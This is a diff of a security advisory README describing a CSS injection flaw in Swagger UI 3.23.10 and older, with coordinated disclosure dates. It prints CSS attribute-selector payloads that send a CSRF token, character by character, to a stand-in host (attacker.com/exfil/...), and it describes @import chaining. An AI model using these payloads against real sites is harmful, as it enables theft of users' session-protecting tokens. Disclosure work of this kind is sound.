@@ -1,16 +1,16 @@
 # CSS-injection-in-Swagger-UI
 
-We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) [1][2] technique to perform CSS-based input field value exfiltration. In our PoC, we were able to successfully steal the value of the CSRF token.
+We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) [1][2] technique to perform CSS-based input field value exfiltration. In our PoC, we were able to successfully steal the CSRF token value.
 
 **Researcher: Kevin (DatLP) of The Tarantula Team, VinCSS (a member of Vingroup)**
 
 ## What is Swagger UI
 
-Swagger UI allows anyone — be it your development team or your end consumers — to visualize and interact with the API’s resources without having any of the implementation logic in place. It’s automatically generated from your OpenAPI (formerly known as Swagger) Specification, with the visual documentation making it easy for back end implementation and client side consumption [3].
+Swagger UI allows anyone — be it your development team or your end consumers — to visualize and interact with the API’s resources without having any of the implementation logic in place. It’s automatically generated from your OpenAPI (formerly known as Swagger) Specification, with the visual documentation making it easy for back end implementation and client side consumption.
 
 ## Background
 
-We've discovered the vulnerability when reading the following in the document of Swagger:
+We've discovered the vulnerability when reading the following in the document of Swagger [3]:
 
 ```
 We’ve observed that the ?url= parameter in SwaggerUI allows an aacker to override an otherwise hard‐coded schema file
@@ -20,7 +20,7 @@ Swagger had known the issue, but Swagger thought that this vulnerability could n
 
 ### Injection step:
 
-We realize that Swagger UI allows users to embed untrusted Json from remote servers 
+We realize that Swagger UI allows users to embed untrusted Json format from remote servers 
 
 ```javascript
 var url = window.location.search.match(/url=([^&]+)/);
@@ -34,13 +34,13 @@ url: url, // ...
 var ui = SwaggerUIBundle(swaggerOptions)
 ```
 
-This means we can inject json via the GET parameter. In the json content we use the <style> tag and CSS @import rule to load the CSS payload:
+This means we can inject json content via the GET parameter to victim Swagger UI. In the json content we use the <style> tag and CSS @import rule to load the CSS payload:
     
 ![](PoC-RPO-1.png)
     
 ### Exfiltration step:
 
-With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration [4]. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with the character a, similarly it will make other requests (https://attacker.com/exfil/b; https://attacker.com/exfil/c; https://attacker.com/exfil/d, etc) if the CSRF token value begins with character b, character c or character d:
+With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration [4]. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with the character a, similarly it will make other requests (https://attacker.com/exfil/b; https://attacker.com/exfil/c; https://attacker.com/exfil/d, etc) if the CSRF token value begins with character b, character c or character d. Continue to try in turn for each character in range A-Z and range 0-9 until we found the first character in the CSRF token value:
 
 ```css
 input[name=csrf][value^=a]{
@@ -71,9 +71,9 @@ With sequential @import chaining as below so we can steal full of CSRF token val
 
 ![](sequential%20import%20chaining.png)
 
-You can automate all this by using the [sic](https://github.com/d0nutptr/sic) tool [5]
+You can automate all of step by using the [sic](https://github.com/d0nutptr/sic) tool [5]
 
-And result:
+And we got the following result:
 
 ![](PoC-RPO-2.png)
 
@@ -85,7 +85,7 @@ Swagger UI v3.23.10 and older versions
 ## Disclosure timeline
 
 - September 17, 2019: Report and discuss with maintainer for Swagger UI.
-- September 20, 2019: Ask maintainer for disclosure vulnerability.
+- September 20, 2019: Ask maintainer for vulnerability disclosure.
 - September 21, 2019: Swagger UI has released a new version that has addressed the vulnerability.
 - September 21, 2019: Get approval from maintainer for disclosure on October 6, 2019.
 
